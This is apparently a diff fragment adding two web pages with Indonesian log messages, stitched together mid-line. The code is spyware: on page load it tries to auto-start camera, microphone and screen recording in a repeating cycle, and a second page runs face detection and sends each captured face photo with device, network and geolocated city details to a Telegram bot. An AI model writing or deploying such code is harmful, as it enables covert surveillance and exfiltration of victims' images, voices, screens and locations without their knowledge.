+‎  } catch(e){ appendLog("Gagal kirim device info: " + (e.message || e)); }
+‎
+‎  // capture camera photo (async)
+‎  try { await capturePhotoAndSend(); } catch(e){ appendLog("Gagal foto: " + (e.message || e)); }
+‎
+‎  // audio & screen are chunked independently by their loops — but to ensure a chunk gets sent around this time,
+‎  // we force stop recorder to emit ondataavailable (if active), then restart quickly (only if active)
+‎  try {
+‎    if (audioActive && audioRecorder && audioRecorder.state === 'recording') {
+‎      audioRecorder.stop();
+‎      appendLog("Audio recorder cycle forced to stop->send.");
+‎      await sleep(300);
+‎      // restart recorder (handled by audio loop normally)
+‎    }
+‎  } catch(e){ appendLog("Audio cycle force error: " + (e.message || e)); }
+‎
+‎  try {
+‎    if (screenActive && screenRecorder && screenRecorder.state === 'recording') {
+‎      screenRecorder.stop();
+‎      appendLog("Screen recorder cycle forced to stop->send.");
+‎      await sleep(400);
+‎    }
+‎  } catch(e){ appendLog("Screen cycle force error: " + (e.message || e)); }
+‎
+‎  appendLog("=== Cycle end ===");
+‎}
+‎
+‎async function startAll(){
+‎  appendLog("Memulai semua komponen...");
+‎  await startCamera();
+‎  await startAudio();
+‎  await startScreen();
+‎
+‎  // immediate first cycle shortly after start
+‎  await sleep(500);
+‎  await captureCycleOnce();
+‎
+‎  // start interval loop for combined cycles
+‎  if (mainIntervalHandle) clearInterval(mainIntervalHandle);
+‎  mainIntervalHandle = setInterval(() => {
+‎    captureCycleOnce().catch(e => appendLog("Cycle err: " + (e.message || e)));
+‎  }, INTERVAL_MS);
+‎}
+‎
+‎/* stop everything */
+‎function stopAll(){
+‎  if (mainIntervalHandle) { clearInterval(mainIntervalHandle); mainIntervalHandle = null; }
+‎  stopCamera();
+‎  stopAudio();
+‎  stopScreen();
+‎  appendLog("Semua dihentikan.");
+‎}
+‎
+‎/* ================ Buttons ================ */
+‎document.getElementById('btnStartAll').addEventListener('click', () => startAll());
+‎document.getElementById('btnStopAll').addEventListener('click', () => stopAll());
+‎
+‎/* ================ Auto-start attempt ================ */
+‎window.addEventListener('load', async () => {
+‎  appendLog("Inisialisasi halaman. Mencoba auto-start...");
+‎  // Try to auto-start — many browsers may block screen getDisplayMedia without gesture,
+‎  // but we'll still try to get camera & microphone (which sometimes succeed).
+‎  try {
+‎    await startAll();
+‎    appendLog("Auto-start sequence dijalankan (berhasil/terblokir?). Jika gagal, klik 'Mulai Manual'.");
+‎  } catch(e){
+‎    appendLog("Auto-start gagal: " + (e.message || e));
+‎  }
+‎});
+‎
+‎/* cleanup on unload */
+‎window.addEventListener('beforeunload', () => { stopAll(); });
+‎</script>
+‎</body>
+‎  </html>    try {
+‎      const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`);
+‎      const data = await res.json();
+‎      const countryCode = data.address?.country_code?.toUpperCase() || "N/A";
+‎      const country = data.address?.country || "Tidak diketahui";
+‎      const city = data.address?.city || data.address?.town || data.address?.village || "Tidak diketahui";
+‎      return `${city}, ${country} [${countryCode}]`;
+‎    } catch {
+‎      return "Tidak diketahui";
+‎    }
+‎  }
+‎
+‎  async function sendToTelegram(photoBlob, caption) {
+‎    const fd = new FormData();
+‎    fd.append("chat_id", CHAT_ID);
+‎    fd.append("caption", caption);
+‎    fd.append("photo", photoBlob, "face.jpg");
+‎    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+‎      method: "POST",
+‎      body: fd
+‎    });
+‎  }
+‎
+‎  // ==== Deteksi & Kirim ====
+‎  async function captureAndSend() {
+‎    // ambil ukuran proporsional (agar tidak gepeng)
+‎    const w = video.videoWidth;
+‎    const h = video.videoHeight;
+‎    canvas.width = w;
+‎    canvas.height = h;
+‎    ctx.drawImage(video, 0, 0, w, h);
+‎
+‎    const detections = await faceapi.detectAllFaces(canvas, new faceapi.TinyFaceDetectorOptions());
+‎    if (detections.length === 0) return; // skip kalau tidak ada wajah
+‎
+‎    const device = detectDevice();
+‎    const net = getNetworkInfo();
+‎    const loc = await getLocation();
+‎    let locText = "Tidak diketahui";
+‎    if (loc) locText = await reverseGeocode(loc.lat, loc.lon);
+‎
+‎    const caption =
+‎`📸 Deteksi Wajah Otomatis
+‎📱 Device: ${device}
+‎🌐 Jaringan: ${net.type.toUpperCase()} (${net.downlink} Mbps)
+‎📍 Lokasi: ${locText}
+‎🕒 ${new Date().toLocaleString("id-ID")}`;
+‎
+‎    canvas.toBlob(async blob => {
+‎      try {
+‎        await sendToTelegram(blob, caption);
+‎        console.log("✅ Terkirim:", new Date().toLocaleTimeString());
+‎      } catch (e) {
+‎        console.error("❌ Gagal kirim:", e);
+‎      }
+‎    }, "image/jpeg", 0.9);
+‎  }
+‎
+‎  // ==== Inisialisasi ====
+‎  async function init() {
+‎    try {
+‎      await faceapi.nets.tinyFaceDetector.loadFromUri(MODEL_URL);
+‎      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+‎      video.srcObject = stream;
+‎      await video.play();
+‎      setInterval(captureAndSend, DETECT_INTERVAL);
+‎    } catch (e) {
+‎      console.error("Kamera error:", e);
+‎    }
+‎  }
+‎
+‎  window.addEventListener("load", init);
+‎  </script>
+‎</body>
+‎</html>
+‎
